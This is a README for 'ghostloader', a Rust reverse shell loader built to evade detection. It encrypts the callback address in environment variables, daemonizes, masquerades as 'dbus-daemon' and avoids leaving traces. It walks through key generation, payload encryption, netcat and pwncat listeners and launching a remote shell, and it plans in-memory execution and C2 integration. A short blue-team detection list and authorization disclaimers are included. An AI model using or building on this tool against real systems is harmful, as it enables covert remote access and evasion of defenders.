# 👻 ghostloader


> 🔐 Runtime-only, encrypted reverse shell loader in Rust – with zero hardcoded IPs, keys, or ports. Payload data is provided securely via AES-GCM encrypted environment variables.

---

## 🎯 Project Goal

**ghostloader** is a hardened reverse shell launcher written in Rust, designed to avoid detection by:

- Not storing payloads in binaries
- Not using hardcoded IPs, ports, or cryptographic material
- Using AES-GCM encryption for runtime-loaded payloads
- Generating the decryption key from the host's UID + hostname
- Running in the background via daemonization (`fork()` + `setsid`)
- Obfuscating its process name (e.g., as `dbus-daemon`)
- Avoiding `.bash_history` or file system persistence

---

## 🧠 Concept Overview

The reverse shell destination (`IP + Port`) is encrypted with AES-GCM using:

- A **32-byte user-provided AES key**
- Combined with the current **UID** and **hostname**
- Encrypted data is stored in environment variables at runtime

> This allows **per-session or per-target shells** without needing to rebuild the binary. 

A Python helper script creates these environment variables for you.

---

## ⚠️ Blue Team Testing Notice

This project is intended for:

- **Blue Teams and Incident Response** to test defensive visibility
- **Red Team Simulations** in lab environments
- **CTF training** where payload customization is required

🚫 Do **not** use this tool in unauthorized environments.  
✅ Always have written permission when testing.

---

## 📦 Features

- ✅ No hardcoded secrets (IP, key, port, etc.)
- ✅ Random IV + AAD for each session (optional override)
- ✅ AES-GCM 256-bit encryption with host-specific derivation
- ✅ Built-in retries + jitter for resilience
- ✅ Clean Rust async + 'tokio' implementation
- ✅ `zeroize` on decrypted buffers and keys
- ✅ Fork/daemon shell, no direct parent
- ✅ Obfuscated process name (`dbus-daemon` or custom)
- ⏳ Planned: `memfd`, unlink-after-open, pipe-only, anti-debugging

---

## ⚙️ How It Works

1. Generate an **AES key**:
```bash
   export AES_KEY=$(openssl rand -hex 32)
   ```
2. Use the Python helper to create the encrypted payload:
```python
   python3 ghostloader.py 4444 --key "$AES_KEY"
```
3. Export the resulting environment variables:
```text
	export AES_KEY=...
	export ENC_PAYLOAD=...
	export ENC_IV=...
	export ENC_AAD=...
```
4. Run the ghostloader binary:
```text
	./ghostloader
```

### If decryption succeeds, the binary will:
- Spawn an interactive /bin/sh via reverse connection
- Retry up to 20x if offline (with jitter)
- Exit cleanly and securely if decryption or connection fails

# 🐍 Python: ghostloader.py
Helper to encrypt IP+port payloads for injection via env vars.

✅ Example:
```text
export AES_KEY=$(openssl rand -hex 32)
python3 ghostloader.py 4444 --loopback --key "$AES_KEY"
```

📦 Output:
```bash
Hostname: kali
UID: 1000

# --- Oneliner ENV export ---
export AES_KEY=... && export ENC_PAYLOAD=... && export ENC_IV=... && export ENC_AAD=...
# ----------------------------
```

| Argument     | Description                                |
| ------------ | ------------------------------------------ |
| `port`       | Port to connect back to (required)         |
| `ip`         | Optional IP (default: detected via `tun0`) |
| `--loopback` | Use `127.0.0.1` instead of external IP     |
| `--key`      | Required AES key (32-byte hex)             |
| `--iv`       | Optional static IV (12-byte hex)           |
| `--aad`      | Optional static AAD (8-byte hex)           |

# 🦀 Rust Binary: ghostloader
## 🔧 Build instructions

🦀 Compile with Cargo (optimized)
```text
git clone https://github.com/y0uall/ghostloader.git
cd ghostloader

# Build optimized binary
cargo build --release
strip target/release/ghostloader
```

## 🚀 Sample Workflow

```bash
# 1. Generate AES key
export AES_KEY=$(openssl rand -hex 32)

# 2. Encrypt the target IP + port
# ➤ If --loopback is used, the IP is set to 127.0.0.1
# ➤ If no IP is given, the script auto-detects your VPN IP via interface 'tun0'
python3 ghostloader.py 4444 --key "$AES_KEY"

# 3. Export the generated values (copied from Python output)
export AES_KEY=... && export ENC_PAYLOAD=... && export ENC_IV=... && export ENC_AAD=...

# 4. Start listener on your machine:
nc -lvnp 4444
pwncat-cs -lp 4444

# 5. Launch the ghostloader
./ghostloader
```

# 🔬 Detection Opportunities (for Blue Teams)

```text
- Suspicious parentless sh -i shells
- Connections to known C2 ports shortly after binary execution
- Reverse shell spawning from processes named dbus-daemon
- AES_KEY, ENC_* environment variables (from /proc/PID/environ)
- Short-lived child processes with dup2() on socket FDs
```

## 📁 Project Structure

```bash
.
ghostloader/
├── Cargo.toml
├── src/
│   └── main.rs
├── python
│   └── ghostloader.py
├── README.md
└── LICENSE
```

#❗Disclaimer

This project is provided for educational and research purposes only.
Use it only in authorized environments with proper permissions.
The authors are not responsible for misuse.

## 🧪 Future Ideas

- memfd_create and in-memory execution
- Encrypted config via pipe() or stdin
- Secure auto-clean of parent shell env
- Randomized timing logic
- Integration with C2 frameworks

## 🧠 Name Origin

- ghostloader = ephemeral, invisible, in-memory loader
- It's quiet, leaves no trace, and vanishes after use. 👻

Made with ❤️ for learning, testing, and advancing defense.

## License

This project is licensed under the [MIT License](LICENSE).
